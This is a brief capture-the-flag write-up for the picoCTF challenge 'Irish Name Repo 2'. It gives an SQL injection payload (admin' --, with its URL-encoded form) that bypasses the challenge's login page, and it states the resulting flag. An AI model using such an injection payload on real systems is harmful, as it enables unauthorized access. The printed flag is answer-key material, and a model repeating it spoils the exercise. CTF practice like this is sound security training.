# Irish Name Repo 2

## Problem

There is a website running at https://jupiter.challenges.picoctf.org/problem/53751/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Solution

Here's the payload for user: `admin' --` (here's the encoded version: `%61%64%6d%69%6e%27%20%2d%2d`), password: `1`

FLAG: `picoCTF{m0R3_SQL_plz_c34df170}`
